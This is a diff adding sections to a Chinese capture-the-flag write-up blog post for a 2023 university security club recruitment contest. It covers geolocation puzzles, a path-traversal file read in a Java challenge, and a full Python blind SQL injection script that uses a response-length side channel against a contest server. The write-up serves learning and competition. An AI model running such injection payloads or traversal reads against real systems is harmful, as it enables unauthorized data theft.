@@ -196,7 +196,10 @@
 <img src="/2023/10/31/YulinSec-Recruit-2023-WP/pic1.png" alt="pic1" style="zoom:25%;">
 
 <p>放到google识图上看看，一眼武汉理工大学南湖校区的图书馆，但MD5之后交Flag发现不对，经询问铃兰小姐得知要交图书馆的名字，于是改成YulinSec{md5(武汉理工大学南湖校区心至楼)}。</p>
-<p>第二问很奇怪，一眼是武汉长江大桥，拍摄视角看起来像是在龟山公园附近，但我把附近的景点都梭哈了一遍也没成功……</p>
+<p><del>第二问很奇怪，一眼是武汉长江大桥，拍摄视角看起来像是在龟山公园附近，但我把附近的景点都梭哈了一遍也没成功……</del></p>
+<h5 id="你的名字是？"><a href="#你的名字是？" class="headerlink" title="你的名字是？"></a>你的名字是？</h5><p>第二问通过问出题人，发现是我<del>猪鼻</del>了，其实还是让题目描述误导了，题目描述举出的例子是人民公园，让我误以为是找公园名字了……</p>
+<p>位置确实是龟山公园没错，但景点应该写龟山风景区，于是改成YulinSec{md5(湖北省武汉市汉阳区龟山北路5号龟山风景区)}。</p>
+<h5 id="我怎么想不起来了-w"><a href="#我怎么想不起来了-w" class="headerlink" title="我怎么想不起来了&gt;w&lt;"></a>我怎么想不起来了&gt;w&lt;</h5><p>第三问的话看出题人QQ空间锁定好时间区间爆破就好了(貌似有更好的办法，但我还没找到)。</p>
 <h4 id="【Baby】babyurl"><a href="#【Baby】babyurl" class="headerlink" title="【Baby】babyurl"></a>【Baby】babyurl</h4><p>本题考查ssrf。</p>
 <p>这道题本来我是通过绕过localhost做的，后来才知道那是非预期，于是我又重新做了一遍。</p>
 <p>首先我们访问题目网页。如下：</p>
@@ -414,6 +417,31 @@
 
 <p>180°翻转后再镜像翻转即为flag后半部分。</p>
 <p>完整flag为：<code>YulinSec&#123;M2tH_1z_s0_iNtlsTInG&#125;</code></p>
+<h4 id="MID-ezjava"><a href="#MID-ezjava" class="headerlink" title="[MID-]ezjava"></a>[MID-]ezjava</h4><h5 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h5><p>首先我们先看访问一下题目网页，由此可知要读取根目录下的flag1和flag2：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1699022819537.png" alt="uTools_1697642119286" style="zoom:50%;">
+
+<p>下载题目附件，之后反编译看源码。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1699023068928.png" alt="uTools_1697642119286" style="zoom:50%;">
+
+<p>由此可知传参方式：当访问&#x2F;flag1&#x2F;*目录时，会转到&#x2F;tmp&#x2F;*，而tmp目录的上一层目录即为根目录。</p>
+<p>于是我们便可读取flag1:</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1699023403377.png" alt="uTools_1697642119286" style="zoom:50%;">
+
+
+
+<h4 id="MID-猫物语"><a href="#MID-猫物语" class="headerlink" title="[MID+]猫物语"></a>[MID+]猫物语</h4><p>这道题属实是思路新奇，是我没见过的类型。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1699024084828.png" alt="uTools_1697642119286" style="zoom:50%;">
+
+<p>先看一下题目描述吧：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1699023537940.png" alt="uTools_1697642119286" style="zoom:50%;">
+
+<p>根据题目描述我们可以知道本题考查sql注入，且无法使用延时注入和布尔盲注，于是我们可以从“所有内容在原本的基础上都会被加上随机一小段长度的喵！”上下手，增加原本内容的长度，使得返回的“喵”数量超过一定程度，并借此判断是否注入成功。之后的思路就和盲注思路一样了。</p>
+<p>脚本如下：</p>
+<p><code>import requests</code><br><code>import time</code></p>
+<p><code>chars = range(48, 129, 1)</code><br><code>flag = &#39;&#39;</code><br><code>global length</code></p>
+<p><code>length = 50</code></p>
+<p><code>close = &quot;?id=-1&quot;</code><br><code>for i in range(1, length + 1):</code><br>    <code>for char1 in chars:</code><br>        <code>url = &quot;http://124.220.110.41:20001/&quot;</code><br>        <code>payload = &quot; union select 1,2,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),%d,1))=%d,repeat(&#39;a&#39;,50),1)--+&quot; % (</code><br>        <code>i, char1)</code><br>        <code>url = url + close + payload</code><br>        <code>res = requests.get(url)</code><br>        <code>print(url + &#39;\n&#39;)</code><br>        <code>if &quot;喵&quot; * 50 in res.text:</code><br>            <code>flag = flag + chr(char1)</code><br>            <code>print(&quot;flag: &quot; + flag)</code><br>            <code>break</code><br>        <code>print(&quot;flag: &quot; + flag)</code><br><code>print(&#39;flag:&#39;, flag)</code></p>
+<p>payload请自行根据想要得到的内容进行更改。</p>
 
     </div>
     
